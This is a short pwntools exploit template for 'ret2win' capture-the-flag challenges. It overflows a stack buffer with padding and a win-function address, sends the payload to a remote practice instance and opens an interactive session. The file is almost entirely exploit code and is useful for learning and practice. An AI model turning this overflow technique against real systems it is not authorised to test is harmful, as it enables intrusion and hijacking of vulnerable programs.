# Ret2win Template

```python
from pwn import *

elf = ELF("/path/to/vuln/binary")
win = p32(elf.symbols.win)  # Choose p32 or p64 depending on 32-bit or 64-bit

# Craft the payload and the remote instance here
payload = b"A"*44 + win
link = "url.to.instance"
port = 12345

def main():
    # p = elf.process()
    p = remote(link, port)
    p.recvuntil("Please enter your string:")  # Choose the prompt to receive
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()

```